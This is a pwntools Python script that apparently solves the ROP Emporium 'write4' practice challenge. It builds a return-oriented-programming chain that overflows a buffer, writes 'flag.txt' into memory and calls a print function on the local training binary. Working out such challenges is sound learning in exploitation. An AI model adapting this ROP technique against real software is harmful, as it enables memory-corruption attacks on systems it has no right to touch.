from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./write4', checksec=False)

p = process("./write4")

#gdb.attach(p, gdbscript='''''')

ret = ROP(elf).find_gadget(["ret"])[0]
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
pop_r14_r15 = ROP(elf).find_gadget(["pop r14", "pop r15", "ret"])[0]
vuln = elf.sym['usefulFunction']
gadget = elf.sym['usefulGadgets']

null_addr = 0x601140

payload = flat(
    cyclic(0x28),
    pop_r14_r15,
    null_addr,
    b"flag.txt",
    gadget,
    pop_rdi_ret,
    null_addr,
    vuln+9
    )
p.sendlineafter(b">",payload)
p.interactive()
